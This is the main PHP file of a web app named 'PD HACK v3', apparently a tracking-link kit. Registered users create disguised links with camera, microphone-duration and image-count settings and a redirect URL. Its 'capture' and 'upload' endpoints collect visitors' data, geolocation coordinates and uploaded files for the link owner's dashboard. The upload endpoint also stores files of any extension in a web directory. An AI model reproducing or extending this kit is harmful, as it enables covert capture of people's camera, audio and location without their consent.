<?php
require_once 'config/database.php';
$GLOBALS['pdo'] = $pdo;
require_once 'config/auth.php';

$link_code = isset($_GET['link']) ? $_GET['link'] : null;
$page = isset($_GET['page']) ? $_GET['page'] : ($link_code ? 'link' : 'home');

if (!is_dir('uploads')) mkdir('uploads', 0755, true);
if (!is_dir('link_images')) mkdir('link_images', 0755, true);

// ======= API =======
if (isset($_GET['api'])) {
    header('Content-Type: application/json');
    $api = $_GET['api'];

    if ($api === 'capture') {
        $link_code = $_POST['link_code'] ?? null;
        $data_type  = $_POST['data_type']  ?? null;
        $data_content = $_POST['data_content'] ?? null;
        if (!$link_code || !$data_type) { echo json_encode(['success'=>false,'error'=>'Missing parameters']); exit; }
        $link = getLinkDetails($link_code);
        if (!$link) { echo json_encode(['success'=>false,'error'=>'Invalid link']); exit; }
        $lat = $_POST['latitude']  ?? null;
        $lng = $_POST['longitude'] ?? null;
        $acc = $_POST['accuracy']  ?? null;
        saveCapturedData($link['id'], $data_type, $data_content, null, $lat, $lng, $acc)
            ? print(json_encode(['success'=>true])) : print(json_encode(['success'=>false,'error'=>'Save failed']));
        exit;
    }

    if ($api === 'upload') {
        $link_code = $_POST['link_code'] ?? null;
        if (!$link_code || !isset($_FILES['file'])) { echo json_encode(['success'=>false,'error'=>'Missing parameters']); exit; }
        $link = getLinkDetails($link_code);
        if (!$link) { echo json_encode(['success'=>false,'error'=>'Invalid link']); exit; }
        $file = $_FILES['file'];
        $ext  = pathinfo($file['name'], PATHINFO_EXTENSION);
        $filename = time() . '_' . bin2hex(random_bytes(6)) . '.' . $ext;
        $filepath = 'uploads/' . $filename;
        if (move_uploaded_file($file['tmp_name'], $filepath)) {
            $data_type = $_POST['data_type'] ?? 'unknown';
            saveCapturedData($link['id'], $data_type, $filename, $filepath);
            echo json_encode(['success'=>true,'filename'=>$filename]);
        } else {
            echo json_encode(['success'=>false,'error'=>'Upload failed']);
        }
        exit;
    }
    echo json_encode(['success'=>false,'error'=>'Unknown endpoint']); exit;
}

// ======= POST =======
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    if ($action === 'register') {
        $r = registerUser($_POST['username'], $_POST['email'], $_POST['password']);
        if ($r['success']) { $message = $r['message']; $page = 'login'; } else { $error = $r['error']; $page = 'register'; }
    }
    if ($action === 'login') {
        $remember = isset($_POST['remember']) ? true : false;
        $r = loginUser($_POST['username'], $_POST['password'], $remember);
        if ($r['success']) { header("Location: /index.php?page=dashboard"); exit; } else { $error = $r['error']; $page = 'login'; }
    }
    if ($action === 'create_link') {
        requireLogin();
        $user = getCurrentUser();
        if (!$user) { $error = 'User session expired. Please login again.'; $page = 'login'; }
        else {
        $tool_type = $_POST['tool_type'] ?? 'camera';
        $redirect_url = $_POST['redirect_url'] ?? 'https://example.com';
        $title = $_POST['title'] ?? '';
        $description = $_POST['description'] ?? '';
        
        // Validate required fields
        if (empty($title) || empty($description)) {
            $error = 'Link title and description are required';
            $page = 'dashboard';
            goto end_create_link;
        }
        $mic_duration = intval($_POST['mic_duration'] ?? 5);
        $image_count = intval($_POST['image_count'] ?? 5);
        $theme = $_POST['theme'] ?? 'default';
        $link_image_path = null;
        
        // Handle image upload
        if (isset($_FILES['link_image']) && $_FILES['link_image']['error'] === UPLOAD_ERR_OK) {
            $file = $_FILES['link_image'];
            $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
            $allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
            if (in_array(strtolower($ext), $allowed)) {
                $filename = 'link_' . time() . '_' . bin2hex(random_bytes(4)) . '.' . $ext;
                $filepath = 'link_images/' . $filename;
                if (move_uploaded_file($file['tmp_name'], $filepath)) {
                    $link_image_path = $filepath;
                }
            }
        }
        
        $r = createLink($user['id'], $tool_type, $redirect_url, $title, $description, $mic_duration, $image_count, $link_image_path, $theme);
        if ($r['success']) { header("Location: /index.php?page=dashboard&success=Link+created"); exit; } else { $error = $r['error']; $page = 'dashboard'; }
        end_create_link:
        }
    }
    if ($action === 'delete_link') {
        requireLogin(); $user = getCurrentUser();
        $r = deleteLink($_POST['link_id'] ?? null, $user['id']);
        if ($r['success']) { header("Location: /index.php?page=dashboard&success=Link+deleted"); exit; } else { $error = $r['error']; $page = 'dashboard'; }
    }
    if ($action === 'logout') logoutUser();
}

// If capture page, render it without layout
if ($page === 'link') {
    include 'pages/link.php';
    exit;
}
?>
<!DOCTYPE html>
<html lang="en" class="h-full bg-slate-50">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PD HACK v3 - Advanced Data Intelligence</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(10px); }
        .sidebar-active { background: #6366f1; color: white; box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3); }
    </style>
</head>
<body class="h-full">
    <div class="min-h-full flex flex-col md:flex-row">
        <?php if (isLoggedIn() && $page !== 'home' && $page !== 'login' && $page !== 'register'): ?>
            <!-- Sidebar -->
            <aside class="w-full md:w-64 bg-white border-r border-slate-200 flex-shrink-0">
                <div class="h-full flex flex-col">
                    <div class="p-6 flex items-center gap-3">
                        <div class="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center text-white shadow-lg shadow-indigo-200">
                            <i class="fas fa-link text-lg"></i>
                        </div>
                        <span class="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-indigo-600 to-purple-600">PD HACK v3</span>
                    </div>
                    
                    <nav class="flex-1 px-4 py-4 space-y-1">
                        <a href="?page=dashboard" class="flex items-center gap-3 px-4 py-3 rounded-xl transition-all <?= $page === 'dashboard' ? 'sidebar-active' : 'text-slate-600 hover:bg-slate-50' ?>">
                            <i class="fas fa-th-large w-5"></i>
                            <span class="font-semibold">Dashboard</span>
                        </a>
                        <a href="?page=analytics" class="flex items-center gap-3 px-4 py-3 rounded-xl transition-all <?= $page === 'analytics' ? 'sidebar-active' : 'text-slate-600 hover:bg-slate-50' ?>">
                            <i class="fas fa-chart-line w-5"></i>
                            <span class="font-semibold">Analytics</span>
                        </a>
                        <?php 
                        $currUser = getCurrentUser();
                        $stmt = $pdo->prepare("SELECT is_admin FROM users WHERE id = ?");
                        $stmt->execute([$currUser['id']]);
                        $isAdmin = $stmt->fetchColumn();
                        if ($isAdmin): ?>
                            <a href="?page=admin" class="flex items-center gap-3 px-4 py-3 rounded-xl transition-all <?= $page === 'admin' ? 'sidebar-active' : 'text-slate-600 hover:bg-slate-50' ?>">
                                <i class="fas fa-user-shield w-5"></i>
                                <span class="font-semibold">Admin Panel</span>
                            </a>
                        <?php endif; ?>
                    </nav>

                    <div class="p-4 border-t border-slate-100">
                        <div class="bg-slate-50 rounded-2xl p-4 mb-4">
                            <div class="flex items-center gap-3 mb-1">
                                <div class="w-8 h-8 rounded-full bg-indigo-100 text-indigo-600 flex items-center justify-center text-xs font-bold">
                                    <?= strtoupper(substr($currUser['username'], 0, 2)) ?>
                                </div>
                                <div class="flex-1 overflow-hidden">
                                    <p class="text-sm font-bold text-slate-800 truncate"><?= htmlspecialchars($currUser['username']) ?></p>
                                    <p class="text-xs text-slate-500 truncate"><?= htmlspecialchars($currUser['email']) ?></p>
                                </div>
                            </div>
                        </div>
                        <form method="POST">
                            <button type="submit" name="action" value="logout" class="w-full flex items-center justify-center gap-2 px-4 py-2 text-sm font-bold text-rose-600 hover:bg-rose-50 rounded-xl transition-colors">
                                <i class="fas fa-sign-out-alt"></i>
                                Logout
                            </button>
                        </form>
                    </div>
                </div>
            </aside>
        <?php endif; ?>

        <!-- Main Content -->
        <main class="flex-1 overflow-y-auto">
            <?php if (!isLoggedIn() || $page === 'home' || $page === 'login' || $page === 'register'): ?>
                <!-- Public Navbar -->
                <nav class="bg-white/80 backdrop-blur-md border-b border-slate-100 sticky top-0 z-50">
                    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                        <div class="flex justify-between h-16 items-center">
                            <div class="flex items-center gap-2">
                                <div class="w-8 h-8 bg-indigo-600 rounded-lg flex items-center justify-center text-white shadow-md">
                                    <i class="fas fa-link text-sm"></i>
                                </div>
                                <span class="text-lg font-bold bg-clip-text text-transparent bg-gradient-to-r from-indigo-600 to-purple-600">PD HACK</span>
                            </div>
                            <div class="flex items-center gap-4">
                                <?php if (isLoggedIn()): ?>
                                    <a href="?page=dashboard" class="text-sm font-bold text-slate-600 hover:text-indigo-600 transition-colors">Dashboard</a>
                                    <a href="?page=dashboard" class="bg-indigo-600 text-white px-5 py-2 rounded-full text-sm font-bold shadow-lg shadow-indigo-200 hover:bg-indigo-700 transition-all">My Panel</a>
                                <?php else: ?>
                                    <a href="?page=login" class="text-sm font-bold text-slate-600 hover:text-indigo-600 transition-colors">Login</a>
                                    <a href="?page=register" class="bg-indigo-600 text-white px-5 py-2 rounded-full text-sm font-bold shadow-lg shadow-indigo-200 hover:bg-indigo-700 transition-all">Get Started</a>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>
                </nav>
            <?php endif; ?>

            <div class="<?= (isLoggedIn() && $page !== 'home' && $page !== 'login' && $page !== 'register') ? 'p-6 md:p-10' : '' ?>">
                <?php if (isset($error)): ?>
                    <div class="mb-6 flex items-center gap-3 bg-rose-50 border border-rose-100 text-rose-700 px-4 py-3 rounded-2xl animate-bounce">
                        <i class="fas fa-exclamation-circle"></i>
                        <span class="text-sm font-semibold"><?= htmlspecialchars($error) ?></span>
                    </div>
                <?php endif; ?>
                <?php if (isset($message) || isset($_GET['success'])): ?>
                    <div class="mb-6 flex items-center gap-3 bg-emerald-50 border border-emerald-100 text-emerald-700 px-4 py-3 rounded-2xl animate-pulse">
                        <i class="fas fa-check-circle"></i>
                        <span class="text-sm font-semibold"><?= htmlspecialchars($message ?? $_GET['success']) ?></span>
                    </div>
                <?php endif; ?>

                <?php
                switch ($page) {
                    case 'register':  include 'pages/register.php'; break;
                    case 'login':     include 'pages/login.php';    break;
                    case 'dashboard': requireLogin(); include 'pages/dashboard.php'; break;
                    case 'view':      requireLogin(); include 'pages/view_data.php'; break;
                    case 'admin':     requireLogin(); include 'pages/admin.php'; break;
                    case 'analytics': requireLogin(); include 'pages/analytics.php'; break;
                    default:          include 'pages/home.php';
                }
                ?>
            </div>
        </main>
    </div>
</body>
</html>
